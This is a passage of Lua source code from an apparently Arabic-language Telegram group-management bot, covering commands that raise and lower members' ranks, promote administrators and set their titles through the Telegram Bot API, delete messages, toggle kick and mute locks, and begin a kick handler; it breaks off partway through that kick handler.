DevHmD:sadd(DevTwix..'HmD:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة المنظفين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع منظف (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة المنظفين")  
end
---------------------------------------------------------------------------------------
--       Rem Cleaner      --
if text ==('تنزيل منظف') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة المنظفين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevHmD:srem(DevTwix..'HmD:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة المنظفين")  
end end
---------------------------------------------------------------------------------------
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة الادمنيه")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع ادمن (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة الادمنيه")  
end
---------------------------------------------------------------------------------------
--        Rem admin       --
if text ==('تنزيل ادمن') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة الادمنيه")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة الادمنيه")  
end end
---------------------------------------------------------------------------------------
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة المميزين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع مميز (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة المميزين")  
end
---------------------------------------------------------------------------------------
--       Rem Vipmem       --
if text ==('تنزيل مميز') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة المميزين")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevHmD:srem(DevTwix..'HmD:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة المميزين")  
end end 
---------------------------------------------------------------------------------------
if text ==('رفع مطي') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Mtte:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة المطيين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مطي @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع مطي @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:Mtte:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة المطاية")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مطي (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع مطي (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Mtte:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة المطاية")  
end
---------------------------------------------------------------------------------------
--       Rem Mtte       --
if text ==('تنزيل مطي') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:Mtte:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة المطاية")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطي @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل مطي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:Mtte:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة المطاية")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مطي (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل مطي (%d+)')
DevHmD:srem(DevTwix..'HmD:Mtte:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة المطاية")  
end 
---------------------------------------------------------------------------------------
if text ==('رفع جلب') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Gell:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة الجلبين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع جلب @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع جلب @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:Gell:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة الجلاب")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع جلب (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع جلب (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:Gell:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة الجلاب")  
end
---------------------------------------------------------------------------------------
--       Rem Gell       --
if text ==('تنزيل جلب') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:Gell:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة الجلاب")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل جلب @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل جلب @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:Gell:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة الجلاب")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل جلب (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل جلب (%d+)')
DevHmD:srem(DevTwix..'HmD:Gell:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة الجلاب")  
end 
---------------------------------------------------------------------------------------
if text ==('رفع تاج') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:TG:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه في قائمة التوج")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع تاج @(.*)') and ChTwixDev(msg) then
local username = text:match('^رفع تاج @(.*)')
function promreply(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:TG:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم رفعه في قائمة التوج")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع تاج (%d+)') and ChTwixDev(msg) then
local user = text:match('رفع تاج (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم تعطيل الرفع من قبل المدراء', 'md')
return false
end
DevHmD:sadd(DevTwix..'HmD:TG:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم رفعه في قائمة التوج")  
end
---------------------------------------------------------------------------------------
--       Rem TG       --
if text ==('تنزيل تاج') and ChTwixDev(msg) then
function prom_reply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:TG:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من قائمة التوج")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل تاج @(.*)') and ChTwixDev(msg) then
local username = text:match('^تنزيل تاج @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:TG:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تنزيله من قائمة التوج")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل تاج (%d+)') and ChTwixDev(msg) then
local user = text:match('تنزيل تاج (%d+)')
DevHmD:srem(DevTwix..'HmD:TG:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⋄︙تم تنزيله من قائمة التوج")  
end 
---------------------------------------------------------------------------------------
if HMDicConstructor(msg) then
if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..DevTwix)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه مشرف في المجموعه")  
else
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..DevTwix)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تنزيله من مشرفين المجموعه")  
else
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..DevTwix)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم رفعه مشرف في جميع الصلاحيات")  
else
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and ChCheck(msg) then
local HmD = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..DevTwix)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم اضافة ↫ "..HmD.." كلقب له")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..HmD)
else
Dev_HmD(msg.chat_id_, msg.id_, 1,'⌯︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
if text == 'لقبه' and ChCheck(msg) then
function ReplyGet(extra, result, success)
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'⋄︙ليس لديه لقب هنا') 
else
local Text = "⋄︙*عزيزي لقبه في المجموعة .*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..GetCustomTitle(result.sender_user_id_,msg.chat_id_)..'' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء لقبة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false 
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplyGet)
end
end
if text == 'لقبي' and ChCheck(msg) then
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'⋄︙ليس لديك لقب هنا') 
else
local Text = "⋄︙*عزيزي لقبك في المجموعة .*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..GetCustomTitle(msg.sender_user_id_,msg.chat_id_)..'' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء القب •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false 
end
end
if text == "راسلني" and ChCheck(msg) then
DevTwixTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
send(msg.sender_user_id_, 0,DevTwixTeam[math.random(#DevTwixTeam)])
end
---------------------------------------------------------------------------------------
if text == "صلاحيتي" or text == "صلاحياتي" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('صلاحيته') or text ==('صلاحياته') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')) and ChCheck(msg) then
local username = text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^صلاحيته (%d+)') or text:match('^صلاحياته (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('صلاحيته (%d+)') or text:match('صلاحياته (%d+)')
Validity(msg,ValidityId)  
end
---------------------------------------------------------------------------------------
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^مسح$") or text:match("^حذف$") or text:match("^» اخفاء الكيبورد ✧$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end end end
---------------------------------------------------------------------------------------
if HmDConstructor(msg) then
if text == "تفعيل الحظر" and ChCheck(msg) and ChTwixDev(msg) or text == "تفعيل الطرد" and ChCheck(msg) and ChTwixDev(msg) then
DevHmD:del(DevTwix.."HmD:Lock:KickBan"..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل الطرد - الحظر",'md')
end
if text == "تعطيل الحظر" and ChCheck(msg) and ChTwixDev(msg) or text == "تعطيل الطرد" and ChCheck(msg) and ChTwixDev(msg) then
DevHmD:set(DevTwix.."HmD:Lock:KickBan"..msg.chat_id_,"true")
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل الطرد - الحظر",'md')
end
if text == "تفعيل الكتم" and ChCheck(msg) and ChTwixDev(msg) or text == "تفعيل التقييد" and ChCheck(msg) and ChTwixDev(msg) then
DevHmD:del(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل الكتم - التقييد",'md')
end
if text == "تعطيل الكتم" and ChCheck(msg) and ChTwixDev(msg) or text == "تعطيل التقييد" and ChCheck(msg) and ChTwixDev(msg) then
DevHmD:set(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_,"true")
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل الكتم - التقييد",'md')
end
end
if HmDConstructor(msg) then
if text == "تفعيل الرفع" and ChCheck(msg) and ChTwixDev(msg) or text == "تفعيل الترقيه" and ChCheck(msg) and ChTwixDev(msg) then
DevHmD:del(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم تعطيل رفع » المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
if text == "تعطيل الرفع" and ChCheck(msg) and ChTwixDev(msg) or text == "تعطيل الترقيه" and ChCheck(msg) and ChTwixDev(msg) then
DevHmD:set(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_,"true")
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم تعطيل رفع » المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
---------------------------------------------------------------------------------------
--          Kick          --
if Admin(msg) then
if text ==('طرد') and ChCheck(msg) and ChTwixDev(msg) then
function KickReply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع طرد » '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⋄︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⋄︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) and ChTwixDev(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:KickBan"..msg.chat_id_) then 
